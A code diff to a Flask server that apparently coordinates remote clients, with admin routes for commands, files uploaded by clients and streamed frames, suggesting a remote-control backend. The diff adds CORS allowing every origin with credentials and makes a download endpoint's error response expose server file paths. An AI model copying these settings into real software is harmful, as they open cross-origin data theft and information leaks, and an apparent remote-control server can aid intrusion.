@@ -6,6 +6,14 @@ from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 
+# Enable CORS to allow the web dashboard to communicate with the server
+# Including 'null' origin to support opening dashboard as a local file
+try:
+    from flask_cors import CORS
+    CORS(app, origins=["*"], supports_credentials=True)
+except ImportError:
+    print("Warning: flask_cors not installed. Web dashboard might fail to connect.")
+
 # --- Global State (In-Memory) ---
 # In a real production app, use a database (Redis/SQLite/Postgres)
 # clients = {
@@ -253,14 +261,31 @@ def admin_response(cmd_id):
 
 @app.route('/admin/download_file/<filename>', methods=['GET'])
 def admin_download(filename):
-    """Admin downloads a file uploaded by client"""
+    """Serve file for download (admin or client)"""
     try:
         safe_filename = secure_filename(filename)
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
-        if os.path.exists(filepath):
-            return send_file(filepath)
-        return jsonify({"error": "File not found"}), 404
+        
+        if not os.path.exists(filepath):
+            print(f"[-] File not found: {filepath}")
+            return jsonify({
+                "error": "File not found",
+                "filename": safe_filename,
+                "path": filepath
+            }), 404
+        
+        file_size = os.path.getsize(filepath)
+        print(f"[*] Serving file: {safe_filename} ({file_size} bytes)")
+        
+        # Use send_file with proper parameters for large file support
+        return send_file(
+            filepath,
+            as_attachment=True,
+            download_name=os.path.basename(safe_filename),
+            mimetype='application/octet-stream'
+        )
     except Exception as e:
+        print(f"[-] Error serving file {filename}: {e}")
         return jsonify({"error": str(e)}), 500
 
 @app.route('/admin/stream_frame/<client_id>', methods=['GET'])
